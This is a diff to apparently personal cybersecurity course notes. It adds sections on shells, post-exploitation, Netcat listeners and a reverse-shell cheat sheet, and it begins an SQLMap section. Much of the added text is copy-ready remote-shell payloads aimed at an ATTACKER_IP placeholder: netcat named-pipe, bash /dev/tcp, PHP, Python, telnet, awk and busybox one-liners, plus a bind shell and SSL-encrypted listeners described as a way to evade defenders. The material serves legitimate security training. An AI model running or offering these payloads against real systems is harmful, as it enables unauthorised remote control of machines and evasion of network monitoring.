@@ -1719,7 +1719,6 @@ Burp Suite is an absolute staple in cybersecurity. It is a Java-based framework 
 There are three main versions of the software, each tailored for different use cases and budgets.
 
 
-
 * **Community Edition:** The free version accessible for non-commercial learning and legal hacking. It contains the essential manual testing tools but restricts or throttles automated features.
 * **Professional Edition:** The unrestricted, paid version used by security professionals. It includes an automated vulnerability scanner, an un-throttled brute-forcer/fuzzer, project saving, reporting, unrestricted extensions, and access to the **Burp Collaborator** (a powerful tool for catching out-of-band, blind vulnerabilities).
 * **Enterprise Edition:** Unlike the desktop versions used for manual hacking, this is a server-hosted version designed for continuous, automated vulnerability scanning across an organization's web applications (similar to how Nessus scans infrastructure).
@@ -1755,4 +1754,191 @@ Burp Suite is highly customizable. Because it is written in Java, you can load p
 
 ---
 
-## Room: [Next Room]
+## Room: [Shells Overview]
+
+* **Objective:** Understand what a shell is in the context of an operating system, and how attackers leverage shell sessions to control compromised systems.
+
+### Key Concepts: The Shell
+* **Definition:** A shell is a piece of software that allows a user to interact with the Operating System (OS). While graphical user interfaces (GUIs) technically count, in cybersecurity, "shell" almost universally refers to a **Command-Line Interface (CLI)**.
+
+* **The Attacker's Shell:** When a hacker says they "popped a shell," it means they successfully exploited a vulnerability and established a session on the target. This session allows them to type commands directly into the compromised machine as if they were sitting right in front of the keyboard.
+
+### Post-Exploitation: What Happens After You Get a Shell?
+Gaining an initial shell is rarely the end of the attack; it's usually just the beginning. Attackers use this access to perform several critical activities:
+
+* **Remote System Control:** The baseline capability. The attacker can execute built-in OS commands, run software, and explore the file system remotely.
+* **Privilege Escalation:** Initial shells often land as low-privileged, restricted users (like a standard web server service account). Attackers will immediately hunt for misconfigurations to elevate their access to `root` (Linux) or `Administrator` / `SYSTEM` (Windows).
+* **Data Exfiltration:** Searching the system for sensitive data, credentials, or proprietary information, packaging it up, and stealing it.
+* **Persistence:** Attackers want to maintain their access even if the server is rebooted or the initial vulnerability is patched. They achieve this by creating hidden user accounts, adding scheduled tasks, or dropping backdoor software.
+* **General Post-Exploitation:** A broad category that includes deploying malware, modifying system configurations, and deleting log files to cover their tracks.
+* **Pivoting (Lateral Movement):** The compromised host is used as a launchpad to attack deeper, internal systems on the network that the attacker couldn't reach directly from the outside internet.
+
+### Key Takeaways
+An initial shell is just a foothold. The real impact of a cyber attack happens during the persistence, privilege escalation, and pivoting phases once the attacker is safely inside the network perimeter.
+
+**Reverse Shell**
+* **Objective:** Understand how a Reverse Shell operates, how to set up a Netcat listener, and how to analyze a standard Linux reverse shell payload.
+
+### Key Concepts: The Reverse Shell
+A reverse shell (or "connect back shell") is the most popular technique for gaining access to a system. Instead of the attacker connecting *to* the target, the attacker forces the target to initiate a connection *back* to the attacker's machine.
+
+
+
+* **Why use it?** Most network firewalls heavily restrict *inbound* traffic but are much more lenient on *outbound* traffic. By making the target reach out to the attacker (especially on common ports like 80 or 443), the connection easily slips past the firewall.
+
+### Step 1: Setting up the Listener (Netcat)
+Before executing the payload on the target, the attacker must set up a machine to "catch" the incoming connection using Netcat (`nc`).
+
+* **Example Command:** `nc -lvnp 443`
+
+| Netcat Flag | Purpose |
+| :--- | :--- |
+| **`-l`** | **Listen:** Tells Netcat to listen for an incoming connection rather than initiating one. |
+| **`-v`** | **Verbose:** Provides detailed output when the connection is established. |
+| **`-n`** | **Numeric:** Prevents DNS lookups, forcing Netcat to use raw IP addresses (speeds up the connection). |
+| **`-p`** | **Port:** Specifies the exact port to listen on (e.g., 443). |
+
+### Step 2: Executing the Payload
+Once the listener is running, the attacker exploits a vulnerability on the target to execute the payload. This payload exposes the target's shell (`sh` or `bash`) over the network.
+
+* **Example Named Pipe Payload:** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
+
+| Payload Segment | Explanation |
+| :--- | :--- |
+| `rm -f /tmp/f;` | Removes any existing file named `f` in the `/tmp` directory to prevent conflicts. |
+| `mkfifo /tmp/f;` | Creates a new "Named Pipe" (FIFO) at `/tmp/f` to act as a two-way communication conduit. |
+| `cat /tmp/f` | Reads incoming data (attacker commands) from the named pipe. |
+| `\| sh -i 2>&1` | Pipes that data into an interactive shell (`sh -i`). The `2>&1` ensures error messages are also captured. |
+| `\| nc IP PORT` | Pipes the shell's output through Netcat directly back to the attacker's machine. |
+| `>/tmp/f` | Redirects the final output back into the named pipe, completing the continuous bi-directional loop. |
+
+### Tools & Commands
+* **Netcat (`nc`):** Often referred to as the "Swiss Army Knife" of networking. Used here to open a listening port to catch the reverse shell.
+
+### Key Takeaways
+Always double-check your IP address and Port when modifying a reverse shell payload! If you specify the wrong IP, the target will send the shell out into the void, and you will be left staring at a blank Netcat listener wondering why the exploit "failed."
+
+**Bind Shell**
+
+* **Objective:** Understand how a Bind Shell operates, when it is used over a reverse shell, and how to analyze a standard Linux bind shell payload.
+
+### Key Concepts: The Bind Shell
+A bind shell does exactly what its name implies: it *binds* a specific port on the compromised target machine and sits there listening, waiting for the attacker to connect to it. 
+
+* **When to use it:** Bind shells are useful when the target network strictly blocks *outbound* connections (making a reverse shell impossible), but allows *inbound* connections.
+* **The Drawback:** They are generally less popular than reverse shells because leaving a random port open and listening on a server is highly suspicious and easily detected by defenders or host-based firewalls.
+
+### Step 1: Setting up the Bind Shell (Target Machine)
+The attacker exploits a vulnerability to execute a payload on the target. This payload opens a listening port and attaches a shell (`bash`) to it.
+
+* **Example Named Pipe Payload:** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`
+
+| Payload Segment | Explanation |
+| :--- | :--- |
+| `rm -f /tmp/f;` | Removes any existing file named `f` in the `/tmp` directory to prevent conflicts. |
+| `mkfifo /tmp/f;` | Creates a new "Named Pipe" (FIFO) at `/tmp/f` to act as a two-way communication conduit. |
+| `cat /tmp/f` | Reads incoming data (commands sent by the attacker) from the named pipe. |
+| `\| bash -i 2>&1` | Pipes that data into an interactive shell (`bash -i`). The `2>&1` ensures error messages are returned to the attacker. |
+| `\| nc -l 0.0.0.0 8080` | Starts Netcat in **listen mode (`-l`)** on all interfaces (`0.0.0.0`) on port `8080`. *This is where it waits for the attacker.* |
+| `>/tmp/f` | Redirects the shell's output back into the named pipe, completing the bi-directional loop. |
+
+* **Privilege Note:** Opening a port below `1024` (like port `80` or `443`) requires `root`/Administrator privileges on the target. Using a higher port like `8080` or `4444` bypasses this restriction for low-privileged users.
+
+### Step 2: Connecting to the Bind Shell (Attacker Machine)
+Once the target is actively listening, the attacker simply connects to the target's IP address and the specified port using Netcat.
+
+* **Example Command:** `nc -nv TARGET_IP 8080`
+
+| Netcat Flag | Purpose |
+| :--- | :--- |
+| **`nc`** | Invokes Netcat to establish the connection. |
+| **`-n`** | **Numeric:** Disables DNS resolution to speed up the connection and avoid generating DNS logs. |
+| **`-v`** | **Verbose:** Provides detailed output confirming that the connection to the open port was successful. |
+
+### Tools & Commands
+* **Netcat (`nc`):** Used on the target to *listen* (`-l`), and used on the attacker machine to *connect*.
+
+### Key Takeaways
+**The Golden Rule of Shells:** * **Reverse Shell:** The Attacker listens (`nc -lvnp`), the Target connects.
+* **Bind Shell:** The Target listens (`nc -l`), the Attacker connects (`nc -nv`).
+
+**Shell Listeners**
+
+* **Objective:** Learn how to use advanced listener utilities beyond basic Netcat (`nc`) to improve interaction quality and encrypt your shell traffic.
+
+### Key Concepts: The Problem with Basic Netcat
+While standard Netcat (`nc -lvnp 443`) is great for initially catching a reverse shell, it is incredibly unstable. By default, you cannot use the arrow keys to edit typos, you cannot use the up-arrow to view command history, and if you accidentally press `Ctrl+C`, it will kill your entire shell session. Furthermore, the traffic is sent in plaintext, meaning network defenders can see everything you type.
+
+### Alternative Listener Utilities
+
+| Utility | Primary Benefit | Command Example | Explanation |
+| :--- | :--- | :--- | :--- |
+| **Rlwrap** | **Quality of Life:** Wraps standard Netcat to provide command history and allow the use of arrow keys for editing text. | `rlwrap nc -lvnp 443` | You execute `rlwrap` and pass the standard `nc` command as an argument. |
+| **Ncat** | **Security:** The Nmap Project's modernized version of Netcat. It supports SSL encryption to hide your shell traffic from network defenders. | `ncat --ssl -lvnp 443` | The `--ssl` flag automatically generates a temporary certificate and encrypts the reverse shell connection. |
+| **Socat** | **Stability & Features:** An incredibly powerful utility for creating socket connections. It can create fully interactive, highly stable TTY shells. | `socat -d -d TCP-LISTEN:443 STDOUT` | `-d -d` enables high verbosity. `TCP-LISTEN:443` opens the port, and `STDOUT` directs the target's output directly to your terminal screen. |
+
+### Tools & Commands
+* **`rlwrap`**: A simple GNU readline wrapper. (Often needs to be installed via `apt install rlwrap` on fresh Linux builds).
+* **`ncat`**: Included by default if Nmap is installed on the system.
+* **`socat`**: A more complex but much more stable networking utility.
+
+### Key Takeaways
+If you ever catch a shell using standard Netcat and accidentally type a command wrong, **do not press Ctrl+C** to cancel it! It will kill the listener and you will lose your shell. Always try to catch shells using `rlwrap nc` to save yourself from that headache.
+
+**Shell Payloads**
+
+* **Objective:** Learn the syntax for various Linux reverse shell payloads across different languages and utilities. These commands are executed on the compromised target to send a shell connection back to the attacker's listener.
+
+### Key Concepts: Payload Selection
+You cannot always rely on Netcat being installed on a target server. A skilled attacker knows how to "live off the land" by using the tools and languages that are already installed on the target machine (like Python, PHP, or Bash) to execute their reverse shell.
+
+### 1. Bash Reverse Shells
+If the target is running a standard Linux environment, Bash is almost always available.
+
+| Payload Type | Command Syntax |
+| :--- | :--- |
+| **Standard Bash** | `bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1` |
+| **Read Line** | `exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 \| while read line; do $line 2>&5 >&5; done` |
+| **File Descriptor (196)** | `0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196` |
+| **File Descriptor (5)** | `bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5` |
+
+### 2. PHP Reverse Shells
+Often used when exploiting web application vulnerabilities (like file uploads or code injection), as web servers frequently have PHP installed.
+
+| Payload Type | Command Syntax |
+| :--- | :--- |
+| **Using `exec`** | `php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'` |
+| **Using `shell_exec`** | `php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'` |
+| **Using `system`** | `php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'` |
+| **Using `passthru`** | `php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'` |
+| **Using `popen`** | `php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'` |
+
+### 3. Python Reverse Shells
+Python is incredibly common on modern Linux servers. *(Note: `PY-C` in the examples below represents `python -c` or `python3 -c`).*
+
+| Payload Type | Command Syntax |
+| :--- | :--- |
+| **Exporting Env Variables** | `export RHOST="ATTACKER_IP"; export RPORT=443; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'` |
+| **Subprocess Module** | `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'` |
+| **Short Version** | `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'` |
+
+### 4. Other Utilities (Living off the Land)
+When standard scripting languages fail, you can try these alternative utilities.
+
+| Payload Type | Command Syntax | Description |
+| :--- | :--- | :--- |
+| **Telnet** | `TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF \| sh 1>$TF` | Uses Telnet and a named pipe to route the shell traffic. |
+| **AWK** | `awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" \|& s; s \|& getline c; if(c){ while ((c \|& getline) > 0) print $0 \|& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` | Abuses the built-in TCP networking capabilities of the AWK text processing tool. |
+| **BusyBox** | `busybox nc ATTACKER_IP 443 -e sh` | Commonly found on embedded systems and IoT devices. Uses a lightweight version of Netcat. |
+
+### Tools & Commands
+* *(Conceptual focus for this task; these are the exact payloads you will copy, modify, and paste into target systems).*
+
+### Key Takeaways
+If a Bash reverse shell fails, don't give up! The server might have restricted outbound bash connections but left Python or PHP completely unrestricted. Always cycle through different payload types when trying to pop a shell.
+
+## Room: [SQLMap: The Basics]
+
+**SQLMap**
+
+* SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying these vulnerabilities. This tool is built into some Linux distributions, but you can easily install it if it's not.
